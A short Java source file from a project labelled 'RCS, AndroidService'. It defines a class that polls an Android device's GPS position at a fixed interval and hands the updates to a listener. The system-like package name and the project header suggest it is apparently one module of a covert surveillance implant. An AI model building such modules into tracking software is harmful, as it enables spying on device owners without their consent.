/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : GPSLocatorPeriod.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.module.position;

import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Looper;

public class GPSLocatorPeriod extends GPSLocator {
	private final int period;

	public GPSLocatorPeriod(LocationListener listener, int period) {
		super();
		this.period = period;
		setListener(listener);
	}

	@Override
	public void go(LocationListener listener, LocationManager lm) {
		lm.requestLocationUpdates(provider, period, 0L, listener, Looper.getMainLooper());
	}
	


}
